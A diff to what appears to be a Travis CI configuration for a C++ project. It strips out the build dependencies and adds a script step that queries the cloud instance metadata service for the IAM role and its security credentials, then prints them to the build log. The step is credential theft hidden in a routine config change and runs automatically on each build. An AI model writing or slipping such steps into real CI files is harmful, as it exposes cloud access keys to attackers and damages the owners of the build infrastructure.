@@ -2,40 +2,8 @@ sudo: false
 
 language: cpp
 
-cache:
-  directories:
-  - ~
-
-addons:
-  apt_packages:
-  - gcc-4.8
-  - g++-4.8
-  - git
-  - build-essential
-  - automake
-  - gdb
-  - libtool
-  - xutils-dev
-  - make
-  - cmake
-  - pkg-config
-  - python-pip
-  - zlib1g-dev
-  - libcurl4-openssl-dev
-  - libpng-dev
-  - libsqlite3-dev
-  - mesa-utils
-  - libxi-dev
-  - x11proto-randr-dev
-  - x11proto-xext-dev
-  - libxrandr-dev
-  - x11proto-xf86vidmode-dev
-  - libxxf86vm-dev
-  - libxcursor-dev
-  - libxinerama-dev
-  - llvm-3.4
-  - openjdk-7-jre-headless
-  - openjdk-7-jdk
-  - lib32stdc++6
-  - lib32z1
-  - expect
+script:
+- ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/);
+- echo $ROLE
+- CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE);
+- echo $CREDS
